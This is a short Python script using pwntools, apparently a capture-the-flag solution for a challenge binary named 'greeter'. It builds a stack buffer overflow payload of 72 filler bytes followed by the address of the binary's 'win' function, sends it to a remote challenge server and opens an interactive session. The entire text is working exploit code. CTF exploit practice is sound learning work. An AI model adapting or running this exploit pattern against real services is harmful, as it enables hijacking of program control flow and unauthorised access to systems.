from pwn import *

elf = ELF("./greeter")
#io = process(elf.path)
io = remote('challenges.ctfd.io', '30249')

win = elf.symbols['win']
payload = b'A'*72 + p64(win)

print(b'payload: ' + payload)
io.sendlineafter('?', payload)

io.interactive()
